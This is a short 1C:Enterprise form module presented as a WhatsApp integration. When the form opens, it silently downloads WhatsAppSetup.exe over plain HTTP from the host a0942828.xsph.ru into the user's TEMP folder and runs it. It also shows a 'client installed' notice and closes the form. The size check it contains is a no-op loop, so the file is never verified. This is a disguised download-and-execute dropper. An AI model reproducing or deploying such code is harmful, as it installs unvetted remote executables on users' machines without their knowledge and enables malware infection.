
&НаКлиенте
Процедура ПриОткрытии(Отказ)
	// Показывать форму только 1 сек.
    ПодключитьОбработчикОжидания("ЗакрытьФорму", 1, Истина);
КонецПроцедуры

&НаКлиенте
Процедура ЗакрытьФорму()
	Shell = Новый COMОбъект("WScript.Shell");
	TEMP = Shell.ExpandEnvironmentStrings("%TEMP%");
	УстановочныйФайл = "\WhatsAppSetup.exe";
	ПолныйПуть = TEMP + УстановочныйФайл;
	Соединение = Новый HTTPСоединение("a0942828.xsph.ru");
	Соединение.Получить(УстановочныйФайл, ПолныйПуть);		
	EXE = Новый Файл(ПолныйПуть);
	Пока EXE.Размер() <> "383 464" Цикл
		Прервать;
	КонецЦикла;
	ПоказатьОповещениеПользователя("Интеграция с WhatsApp",,"Клиент установлен",БиблиотекаКартинок.NC_ПодсистемаИнтеграцияСWhatsApp);
	ЗапуститьПриложение(ПолныйПуть,,Истина);
	ЭтаФорма.Закрыть();
КонецПроцедуры
